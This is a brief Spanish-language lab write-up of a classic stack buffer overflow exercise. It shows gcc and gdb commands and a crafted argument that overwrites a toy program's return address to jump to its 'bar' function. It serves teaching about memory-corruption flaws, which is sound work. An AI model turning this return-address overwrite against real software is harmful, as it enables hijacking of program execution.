Vulnerabilidad que se explota realizando un buffer overflow, el objetivo es conseguir sobreescribir la dirección de retorno de la función para que llame al método bar.

Una vez ejecutamos y hallamos la dirección donde se encuentra el método bar, en este caso la dirección 0x5555555551a5 se sobreescribe la dirección pasando por parámetro.

```
$ gcc -o stack stackoverrun.c
$ gdb stack
(gdb) r

Address of foo = 0x555555555155
Address of bar = 0x5555555551a5
Please supply a string as an argument!

(gdb) r $(printf "aaaaaaaaaabbbbbbbb\xa5\x51\x55\x55\x55\x55")

        ...
Augh! I've been hacked!
        ...

```